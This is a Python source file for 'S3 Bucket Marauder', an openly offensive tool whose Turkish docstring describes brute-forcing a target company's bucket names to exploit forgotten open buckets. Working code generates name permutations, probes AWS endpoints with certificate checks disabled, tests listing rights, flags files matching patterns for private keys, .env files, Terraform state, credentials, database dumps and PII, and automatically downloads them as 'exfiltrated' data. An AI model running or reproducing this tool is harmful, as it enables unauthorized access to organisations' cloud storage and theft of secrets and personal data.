#!/usr/bin/env python3
"""
S3 Bucket Marauder - Cloud Storage Reconnaissance & Exfiltration
================================================================
Hedef şirketin adını varyasyonlarla tarayıp (brute-force), 
açık unutulmuş S3 bucket'larını bulan ve içindeki hassas verileri sömüren modül.

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import json
import re
import hashlib
import secrets
import string
import itertools
import threading
import queue
import time
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Set, Tuple, Generator
from enum import Enum
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.request
import urllib.error
import ssl


class BucketStatus(Enum):
    """S3 bucket status"""
    EXISTS_PUBLIC = "exists_public"
    EXISTS_PRIVATE = "exists_private"
    EXISTS_AUTHENTICATED = "exists_authenticated"
    NOT_FOUND = "not_found"
    ACCESS_DENIED = "access_denied"
    REDIRECT = "redirect"
    ERROR = "error"


class DataSensitivity(Enum):
    """Data sensitivity classification"""
    CRITICAL = "critical"      # Credentials, keys, passwords
    HIGH = "high"              # PII, financial data
    MEDIUM = "medium"          # Internal documents
    LOW = "low"                # Public or non-sensitive
    UNKNOWN = "unknown"


@dataclass
class BucketFinding:
    """S3 bucket finding"""
    bucket_name: str
    status: BucketStatus
    region: str = "us-east-1"
    is_public: bool = False
    list_allowed: bool = False
    read_allowed: bool = False
    write_allowed: bool = False
    objects_count: int = 0
    total_size: int = 0
    interesting_files: List[Dict] = field(default_factory=list)
    discovered_at: str = field(default_factory=lambda: datetime.now().isoformat())
    
    def to_dict(self) -> Dict:
        return {
            "bucket_name": self.bucket_name,
            "status": self.status.value,
            "region": self.region,
            "is_public": self.is_public,
            "list_allowed": self.list_allowed,
            "read_allowed": self.read_allowed,
            "write_allowed": self.write_allowed,
            "objects_count": self.objects_count,
            "total_size": self.total_size,
            "interesting_files": self.interesting_files,
            "discovered_at": self.discovered_at
        }


@dataclass
class ExfiltratedData:
    """Exfiltrated data container"""
    bucket: str
    key: str
    size: int
    content: bytes
    content_type: str
    sensitivity: DataSensitivity
    downloaded_at: str = field(default_factory=lambda: datetime.now().isoformat())


class S3BucketMarauder:
    """
    S3 Bucket Marauder
    ==================
    Reconnaissance and exfiltration tool for S3 buckets.
    
    Features:
    - Company name permutation generator
    - Multi-threaded bucket enumeration
    - Public bucket detection
    - Sensitive file identification
    - Automated data exfiltration
    """
    
    # AWS Regions
    AWS_REGIONS = [
        "us-east-1", "us-east-2", "us-west-1", "us-west-2",
        "eu-west-1", "eu-west-2", "eu-west-3", "eu-central-1", "eu-north-1",
        "ap-south-1", "ap-southeast-1", "ap-southeast-2", "ap-northeast-1",
        "ap-northeast-2", "ap-northeast-3", "sa-east-1", "ca-central-1",
        "me-south-1", "af-south-1"
    ]
    
    # Common bucket name patterns
    BUCKET_PATTERNS = [
        "{company}",
        "{company}-backup",
        "{company}-backups",
        "{company}-bak",
        "{company}-dev",
        "{company}-development",
        "{company}-staging",
        "{company}-stage",
        "{company}-prod",
        "{company}-production",
        "{company}-test",
        "{company}-testing",
        "{company}-qa",
        "{company}-uat",
        "{company}-data",
        "{company}-files",
        "{company}-assets",
        "{company}-static",
        "{company}-media",
        "{company}-images",
        "{company}-uploads",
        "{company}-downloads",
        "{company}-public",
        "{company}-private",
        "{company}-internal",
        "{company}-external",
        "{company}-logs",
        "{company}-logging",
        "{company}-audit",
        "{company}-archive",
        "{company}-archives",
        "{company}-db",
        "{company}-database",
        "{company}-sql",
        "{company}-mysql",
        "{company}-postgres",
        "{company}-mongo",
        "{company}-redis",
        "{company}-elastic",
        "{company}-elasticsearch",
        "{company}-config",
        "{company}-configs",
        "{company}-configuration",
        "{company}-secrets",
        "{company}-credentials",
        "{company}-keys",
        "{company}-terraform",
        "{company}-tf",
        "{company}-cloudformation",
        "{company}-cfn",
        "{company}-ansible",
        "{company}-puppet",
        "{company}-chef",
        "{company}-docker",
        "{company}-k8s",
        "{company}-kubernetes",
        "{company}-jenkins",
        "{company}-ci",
        "{company}-cd",
        "{company}-cicd",
        "{company}-artifacts",
        "{company}-builds",
        "{company}-releases",
        "{company}-deploy",
        "{company}-deployment",
        "{company}-lambda",
        "{company}-functions",
        "{company}-api",
        "{company}-apis",
        "{company}-web",
        "{company}-www",
        "{company}-website",
        "{company}-app",
        "{company}-application",
        "{company}-mobile",
        "{company}-ios",
        "{company}-android",
        "{company}-reports",
        "{company}-analytics",
        "{company}-metrics",
        "{company}-monitoring",
        "{company}-docs",
        "{company}-documents",
        "{company}-documentation",
        "{company}-legal",
        "{company}-hr",
        "{company}-finance",
        "{company}-accounting",
        "{company}-payroll",
        "{company}-invoices",
        "{company}-contracts",
        "{company}-clients",
        "{company}-customers",
        "{company}-users",
        "{company}-emails",
        "{company}-mail",
        "{company}-marketing",
        "{company}-sales",
        "{company}-crm",
        "{company}-erp",
        "{company}-temp",
        "{company}-tmp",
        "{company}-scratch",
        "{company}-s3",
        "{company}-bucket",
        "{company}-storage",
        "{company}-store",
        # Year variations
        "{company}-2023",
        "{company}-2024",
        "{company}-2025",
        "{company}-2026",
        # Region variations
        "{company}-us",
        "{company}-eu",
        "{company}-asia",
        "{company}-global",
    ]
    
    # Additional prefixes/suffixes
    PREFIXES = ["", "s3-", "aws-", "cloud-", "bucket-", "data-"]
    SUFFIXES = ["", "-s3", "-aws", "-bucket", "-01", "-1", "-001", "-a", "-main"]
    
    # Environment indicators
    ENVIRONMENTS = ["dev", "development", "staging", "stage", "prod", "production", 
                   "test", "testing", "qa", "uat", "sandbox", "demo"]
    
    # Sensitive file patterns
    SENSITIVE_PATTERNS = {
        DataSensitivity.CRITICAL: [
            r'\.pem$', r'\.key$', r'\.p12$', r'\.pfx$', r'\.pkcs12$',
            r'id_rsa', r'id_dsa', r'id_ecdsa', r'id_ed25519',
            r'\.env$', r'\.env\.', r'env\.json', r'env\.yaml',
            r'credentials', r'password', r'passwd', r'secret',
            r'aws_access_key', r'aws_secret', r'api_key', r'apikey',
            r'private.*key', r'\.htpasswd$', r'\.netrc$',
            r'terraform\.tfstate', r'\.tfstate$',
            r'kubeconfig', r'kube.*config',
            r'docker.*config\.json', r'\.docker/config\.json',
            r'\.npmrc$', r'\.pypirc$', r'\.gem/credentials',
            r'wp-config\.php', r'configuration\.php',
            r'database\.yml', r'database\.json',
        ],
        DataSensitivity.HIGH: [
            r'\.sql$', r'\.sql\.gz$', r'\.sql\.bz2$',
            r'\.dump$', r'\.dump\.gz$',
            r'backup.*\.tar', r'backup.*\.zip', r'backup.*\.gz',
            r'\.bak$', r'\.backup$', r'\.old$',
            r'\.csv$', r'\.xlsx$', r'\.xls$',
            r'users\.', r'customers\.', r'clients\.',
            r'employees\.', r'payroll\.', r'salary\.',
            r'ssn', r'social.*security', r'credit.*card',
            r'\.mdb$', r'\.accdb$', r'\.sqlite$', r'\.db$',
            r'git-credentials', r'\.git-credentials$',
            r'\.bash_history', r'\.zsh_history',
        ],
        DataSensitivity.MEDIUM: [
            r'\.doc$', r'\.docx$', r'\.pdf$', r'\.ppt$', r'\.pptx$',
            r'\.odt$', r'\.ods$', r'\.odp$',
            r'confidential', r'internal', r'private',
            r'\.log$', r'\.logs$',
            r'\.config$', r'\.conf$', r'\.cfg$', r'\.ini$',
            r'\.json$', r'\.yaml$', r'\.yml$', r'\.xml$',
            r'readme', r'changelog', r'license',
        ]
    }
    
    def __init__(self, threads: int = 20, timeout: int = 5):
        self.threads = threads
        self.timeout = timeout
        self.findings: List[BucketFinding] = []
        self.exfiltrated: List[ExfiltratedData] = []
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._progress_callback = None
        
        # SSL context for HTTPS requests
        self._ssl_context = ssl.create_default_context()
        self._ssl_context.check_hostname = False
        self._ssl_context.verify_mode = ssl.CERT_NONE
    
    def generate_company_variations(self, company_name: str) -> Set[str]:
        """Generate company name variations"""
        variations = set()
        
        # Base name cleaning
        base = company_name.lower().strip()
        base = re.sub(r'[^a-z0-9]', '', base)
        
        # Add base
        variations.add(base)
        
        # Common variations
        if len(base) > 3:
            # Abbreviations
            variations.add(base[:3])
            variations.add(base[:4])
            
            # Without vowels
            no_vowels = re.sub(r'[aeiou]', '', base)
            if len(no_vowels) > 2:
                variations.add(no_vowels)
        
        # With common separators
        words = re.findall(r'[a-z]+', company_name.lower())
        if len(words) > 1:
            variations.add('-'.join(words))
            variations.add(''.join(words))
            variations.add(''.join(w[0] for w in words))  # Acronym
        
        # Add hyphenated version
        if ' ' in company_name or '_' in company_name:
            hyphenated = re.sub(r'[\s_]+', '-', company_name.lower())
            hyphenated = re.sub(r'[^a-z0-9-]', '', hyphenated)
            variations.add(hyphenated)
        
        return variations
    
    def generate_bucket_names(self, company_name: str, 
                              custom_patterns: List[str] = None,
                              include_regions: bool = False) -> Generator[str, None, None]:
        """Generate all possible bucket name permutations"""
        
        variations = self.generate_company_variations(company_name)
        patterns = custom_patterns or self.BUCKET_PATTERNS
        
        generated = set()
        
        for variation in variations:
            for pattern in patterns:
                bucket_name = pattern.format(company=variation)
                
                # Apply prefixes and suffixes
                for prefix in self.PREFIXES:
                    for suffix in self.SUFFIXES:
                        full_name = f"{prefix}{bucket_name}{suffix}"
                        
                        # Clean and validate
                        full_name = re.sub(r'-+', '-', full_name)
                        full_name = full_name.strip('-')
                        
                        if self._is_valid_bucket_name(full_name):
                            if full_name not in generated:
                                generated.add(full_name)
                                yield full_name
                                
                                # Add region-specific names if requested
                                if include_regions:
                                    for region in self.AWS_REGIONS[:5]:  # Top 5 regions
                                        region_name = f"{full_name}-{region}"
                                        if region_name not in generated:
                                            generated.add(region_name)
                                            yield region_name
    
    def _is_valid_bucket_name(self, name: str) -> bool:
        """Check if bucket name is valid according to S3 rules"""
        if len(name) < 3 or len(name) > 63:
            return False
        if not re.match(r'^[a-z0-9][a-z0-9.-]*[a-z0-9]$', name):
            return False
        if '..' in name or '.-' in name or '-.' in name:
            return False
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', name):
            return False
        return True
    
    def check_bucket_exists(self, bucket_name: str) -> BucketFinding:
        """Check if S3 bucket exists and its permissions"""
        
        finding = BucketFinding(bucket_name=bucket_name, status=BucketStatus.NOT_FOUND)
        
        # Try different endpoints
        endpoints = [
            f"https://{bucket_name}.s3.amazonaws.com",
            f"https://s3.amazonaws.com/{bucket_name}",
        ]
        
        for endpoint in endpoints:
            if self._stop_event.is_set():
                break
            
            try:
                request = urllib.request.Request(endpoint, method='HEAD')
                request.add_header('User-Agent', 'Mozilla/5.0 (compatible; AWSBucketScanner/1.0)')
                
                with urllib.request.urlopen(request, timeout=self.timeout, 
                                           context=self._ssl_context) as response:
                    # Bucket exists and is accessible
                    finding.status = BucketStatus.EXISTS_PUBLIC
                    finding.is_public = True
                    
                    # Try to determine region from headers
                    region = response.headers.get('x-amz-bucket-region', 'us-east-1')
                    finding.region = region
                    
            except urllib.error.HTTPError as e:
                if e.code == 403:
                    # Bucket exists but access denied
                    finding.status = BucketStatus.EXISTS_PRIVATE
                    finding.region = e.headers.get('x-amz-bucket-region', 'us-east-1')
                elif e.code == 404:
                    # Bucket does not exist
                    finding.status = BucketStatus.NOT_FOUND
                elif e.code == 301:
                    # Redirect (wrong region)
                    finding.status = BucketStatus.REDIRECT
                    finding.region = e.headers.get('x-amz-bucket-region', 'unknown')
                else:
                    finding.status = BucketStatus.ERROR
                break
            except urllib.error.URLError:
                # Connection error
                finding.status = BucketStatus.NOT_FOUND
                break
            except Exception:
                finding.status = BucketStatus.ERROR
                break
        
        # If bucket exists, check listing permission
        if finding.status in [BucketStatus.EXISTS_PUBLIC, BucketStatus.EXISTS_PRIVATE]:
            self._check_list_permission(finding)
        
        return finding
    
    def _check_list_permission(self, finding: BucketFinding):
        """Check if bucket allows listing"""
        
        endpoint = f"https://{finding.bucket_name}.s3.{finding.region}.amazonaws.com?max-keys=10"
        
        try:
            request = urllib.request.Request(endpoint)
            request.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(request, timeout=self.timeout,
                                        context=self._ssl_context) as response:
                content = response.read().decode('utf-8', errors='ignore')
                
                if '<Contents>' in content or '<Key>' in content:
                    finding.list_allowed = True
                    finding.is_public = True
                    finding.status = BucketStatus.EXISTS_PUBLIC
                    
                    # Parse objects from XML
                    objects = self._parse_bucket_listing(content)
                    finding.objects_count = len(objects)
                    
                    # Check for interesting files
                    for obj in objects:
                        sensitivity = self._classify_file_sensitivity(obj['key'])
                        if sensitivity != DataSensitivity.UNKNOWN:
                            finding.interesting_files.append({
                                'key': obj['key'],
                                'size': obj.get('size', 0),
                                'sensitivity': sensitivity.value
                            })
                    
        except urllib.error.HTTPError as e:
            if e.code == 403:
                finding.list_allowed = False
            else:
                pass
        except Exception:
            pass
    
    def _parse_bucket_listing(self, xml_content: str) -> List[Dict]:
        """Parse S3 bucket listing XML"""
        objects = []
        
        # Simple regex parsing (avoiding XML library dependency)
        keys = re.findall(r'<Key>([^<]+)</Key>', xml_content)
        sizes = re.findall(r'<Size>(\d+)</Size>', xml_content)
        
        for i, key in enumerate(keys):
            obj = {'key': key}
            if i < len(sizes):
                obj['size'] = int(sizes[i])
            objects.append(obj)
        
        return objects
    
    def _classify_file_sensitivity(self, filename: str) -> DataSensitivity:
        """Classify file sensitivity based on name"""
        
        filename_lower = filename.lower()
        
        for sensitivity, patterns in self.SENSITIVE_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, filename_lower):
                    return sensitivity
        
        return DataSensitivity.UNKNOWN
    
    def scan_buckets(self, company_name: str, 
                     custom_wordlist: List[str] = None,
                     max_buckets: int = None,
                     progress_callback=None) -> List[BucketFinding]:
        """Scan for S3 buckets matching company name patterns"""
        
        self._progress_callback = progress_callback
        self._stop_event.clear()
        
        # Generate bucket names
        if custom_wordlist:
            bucket_names = list(custom_wordlist)
        else:
            bucket_names = list(self.generate_bucket_names(company_name))
        
        if max_buckets:
            bucket_names = bucket_names[:max_buckets]
        
        total = len(bucket_names)
        completed = 0
        found_buckets = []
        
        def scan_worker(bucket_name: str) -> Optional[BucketFinding]:
            nonlocal completed
            
            if self._stop_event.is_set():
                return None
            
            finding = self.check_bucket_exists(bucket_name)
            
            with self._lock:
                completed += 1
                if self._progress_callback:
                    self._progress_callback(completed, total, bucket_name, finding)
            
            if finding.status != BucketStatus.NOT_FOUND:
                return finding
            return None
        
        # Use thread pool for parallel scanning
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(scan_worker, name): name 
                      for name in bucket_names}
            
            for future in as_completed(futures):
                if self._stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
                
                try:
                    result = future.result()
                    if result:
                        with self._lock:
                            found_buckets.append(result)
                            self.findings.append(result)
                except Exception:
                    pass
        
        return found_buckets
    
    def download_file(self, bucket_name: str, key: str, region: str = "us-east-1",
                      max_size: int = 10 * 1024 * 1024) -> Optional[ExfiltratedData]:
        """Download a file from S3 bucket"""
        
        endpoint = f"https://{bucket_name}.s3.{region}.amazonaws.com/{key}"
        
        try:
            request = urllib.request.Request(endpoint)
            request.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(request, timeout=30,
                                        context=self._ssl_context) as response:
                # Check size before downloading
                content_length = response.headers.get('Content-Length')
                if content_length and int(content_length) > max_size:
                    return None
                
                content = response.read(max_size)
                content_type = response.headers.get('Content-Type', 'application/octet-stream')
                
                sensitivity = self._classify_file_sensitivity(key)
                
                exfil_data = ExfiltratedData(
                    bucket=bucket_name,
                    key=key,
                    size=len(content),
                    content=content,
                    content_type=content_type,
                    sensitivity=sensitivity
                )
                
                with self._lock:
                    self.exfiltrated.append(exfil_data)
                
                return exfil_data
                
        except Exception:
            return None
    
    def exfiltrate_bucket(self, finding: BucketFinding,
                          sensitivity_filter: List[DataSensitivity] = None,
                          max_files: int = 100) -> List[ExfiltratedData]:
        """Exfiltrate sensitive files from a bucket"""
        
        if not finding.list_allowed:
            return []
        
        sensitivity_filter = sensitivity_filter or [
            DataSensitivity.CRITICAL,
            DataSensitivity.HIGH
        ]
        
        downloaded = []
        
        # First, get full listing
        endpoint = f"https://{finding.bucket_name}.s3.{finding.region}.amazonaws.com?max-keys=1000"
        
        try:
            request = urllib.request.Request(endpoint)
            request.add_header('User-Agent', 'Mozilla/5.0')
            
            with urllib.request.urlopen(request, timeout=30,
                                        context=self._ssl_context) as response:
                content = response.read().decode('utf-8', errors='ignore')
                objects = self._parse_bucket_listing(content)
                
                count = 0
                for obj in objects:
                    if count >= max_files:
                        break
                    
                    sensitivity = self._classify_file_sensitivity(obj['key'])
                    
                    if sensitivity in sensitivity_filter:
                        data = self.download_file(
                            finding.bucket_name,
                            obj['key'],
                            finding.region
                        )
                        if data:
                            downloaded.append(data)
                            count += 1
                
        except Exception:
            pass
        
        return downloaded
    
    def generate_report(self) -> Dict:
        """Generate scan report"""
        
        public_buckets = [f for f in self.findings 
                         if f.status == BucketStatus.EXISTS_PUBLIC]
        private_buckets = [f for f in self.findings 
                          if f.status == BucketStatus.EXISTS_PRIVATE]
        
        critical_files = []
        for finding in self.findings:
            for file in finding.interesting_files:
                if file['sensitivity'] == DataSensitivity.CRITICAL.value:
                    critical_files.append({
                        'bucket': finding.bucket_name,
                        'file': file['key'],
                        'size': file.get('size', 0)
                    })
        
        return {
            "scan_summary": {
                "total_buckets_found": len(self.findings),
                "public_buckets": len(public_buckets),
                "private_buckets": len(private_buckets),
                "listable_buckets": sum(1 for f in self.findings if f.list_allowed),
                "total_interesting_files": sum(len(f.interesting_files) for f in self.findings),
                "critical_files": len(critical_files),
                "data_exfiltrated": len(self.exfiltrated),
                "total_bytes_exfiltrated": sum(d.size for d in self.exfiltrated)
            },
            "public_buckets": [f.to_dict() for f in public_buckets],
            "private_buckets": [f.to_dict() for f in private_buckets],
            "critical_files": critical_files,
            "exfiltrated_files": [
                {
                    "bucket": d.bucket,
                    "key": d.key,
                    "size": d.size,
                    "sensitivity": d.sensitivity.value,
                    "downloaded_at": d.downloaded_at
                }
                for d in self.exfiltrated
            ]
        }
    
    def generate_wordlist(self, company_name: str, output_file: str = None) -> List[str]:
        """Generate wordlist for external tools"""
        
        bucket_names = list(self.generate_bucket_names(company_name, include_regions=True))
        
        if output_file:
            with open(output_file, 'w') as f:
                f.write('\n'.join(bucket_names))
        
        return bucket_names
    
    def stop(self):
        """Stop ongoing scan"""
        self._stop_event.set()
    
    def get_statistics(self) -> Dict:
        """Get current scan statistics"""
        return {
            "total_findings": len(self.findings),
            "public_buckets": sum(1 for f in self.findings 
                                 if f.status == BucketStatus.EXISTS_PUBLIC),
            "private_buckets": sum(1 for f in self.findings 
                                  if f.status == BucketStatus.EXISTS_PRIVATE),
            "listable_buckets": sum(1 for f in self.findings if f.list_allowed),
            "interesting_files": sum(len(f.interesting_files) for f in self.findings),
            "exfiltrated_count": len(self.exfiltrated),
            "exfiltrated_bytes": sum(d.size for d in self.exfiltrated)
        }


class S3BucketEnumerator:
    """
    Advanced S3 bucket enumeration with multiple techniques
    """
    
    # Known bucket name patterns from public breaches
    KNOWN_PATTERNS = [
        "{company}-backup-{year}",
        "{company}-db-backup",
        "{company}-sql-dump",
        "{company}-export-{year}",
        "{company}-logs-{year}",
        "{company}-archive-{year}",
        "{company}-data-lake",
        "{company}-datalake",
        "{company}-bi-reports",
        "{company}-analytics-raw",
        "{company}-etl-staging",
        "{company}-temp-upload",
        "{company}-user-uploads",
        "{company}-customer-data",
        "{company}-pii-data",
        "{company}-gdpr-export",
        "{company}-compliance",
        "{company}-audit-logs",
        "{company}-cloudtrail",
        "{company}-flowlogs",
        "{company}-vpc-logs",
        "{company}-terraform-state",
        "{company}-tf-state",
        "{company}-pulumi-state",
        "{company}-cfn-templates",
        "{company}-sam-artifacts",
        "{company}-cdk-assets",
        "{company}-pipeline-artifacts",
        "{company}-codebuild-cache",
        "{company}-codepipeline",
        "{company}-docker-registry",
        "{company}-ecr-cache",
        "{company}-lambda-layers",
        "{company}-lambda-code",
        "{company}-glue-scripts",
        "{company}-emr-logs",
        "{company}-athena-results",
        "{company}-quicksight",
        "{company}-sagemaker-data",
        "{company}-ml-models",
        "{company}-training-data",
    ]
    
    def __init__(self):
        self.marauder = S3BucketMarauder()
    
    def enumerate_with_year_variations(self, company_name: str, 
                                       start_year: int = 2020,
                                       end_year: int = 2026) -> List[str]:
        """Generate bucket names with year variations"""
        
        names = []
        years = list(range(start_year, end_year + 1))
        
        for pattern in self.KNOWN_PATTERNS:
            for year in years:
                name = pattern.format(company=company_name.lower(), year=year)
                if self.marauder._is_valid_bucket_name(name):
                    names.append(name)
        
        return names
    
    def enumerate_from_dns(self, domain: str) -> List[str]:
        """Extract potential bucket names from DNS records"""
        
        # In real implementation, this would query DNS
        # For now, generate based on domain
        parts = domain.lower().replace('.', '-').split('-')
        company = parts[0]
        
        names = list(self.marauder.generate_bucket_names(company))
        
        # Add domain-based variations
        domain_clean = domain.lower().replace('.', '-')
        names.extend([
            domain_clean,
            f"{domain_clean}-cdn",
            f"{domain_clean}-static",
            f"{domain_clean}-assets",
            f"{domain_clean}-media",
            f"cdn-{domain_clean}",
            f"static-{domain_clean}",
        ])
        
        return list(set(names))
    
    def enumerate_from_certificate(self, cert_domains: List[str]) -> List[str]:
        """Extract bucket names from certificate SANs"""
        
        names = []
        for domain in cert_domains:
            names.extend(self.enumerate_from_dns(domain))
        
        return list(set(names))


# Singleton instance
_marauder = None

def get_marauder() -> S3BucketMarauder:
    """Get singleton marauder instance"""
    global _marauder
    if _marauder is None:
        _marauder = S3BucketMarauder()
    return _marauder


def demo():
    """Demonstrate S3 bucket marauder capabilities"""
    print("=" * 60)
    print("S3 Bucket Marauder - Cloud Storage Reconnaissance")
    print("=" * 60)
    
    marauder = get_marauder()
    
    # Generate bucket names for a company
    company = "acmecorp"
    print(f"\n[*] Generating bucket names for: {company}")
    
    bucket_names = list(marauder.generate_bucket_names(company))
    print(f"[+] Generated {len(bucket_names)} bucket name variations")
    print(f"[+] Sample names:")
    for name in bucket_names[:10]:
        print(f"    - {name}")
    
    # Show wordlist stats
    enumerator = S3BucketEnumerator()
    year_names = enumerator.enumerate_with_year_variations(company)
    print(f"\n[+] Year-based variations: {len(year_names)}")
    
    # Show sensitive file patterns
    print(f"\n[*] Sensitive file detection patterns:")
    print(f"    - Critical patterns: {len(marauder.SENSITIVE_PATTERNS[DataSensitivity.CRITICAL])}")
    print(f"    - High patterns: {len(marauder.SENSITIVE_PATTERNS[DataSensitivity.HIGH])}")
    print(f"    - Medium patterns: {len(marauder.SENSITIVE_PATTERNS[DataSensitivity.MEDIUM])}")
    
    print("\n[*] Ready for bucket scanning (use scan_buckets method)")
    print("-" * 60)


if __name__ == "__main__":
    demo()
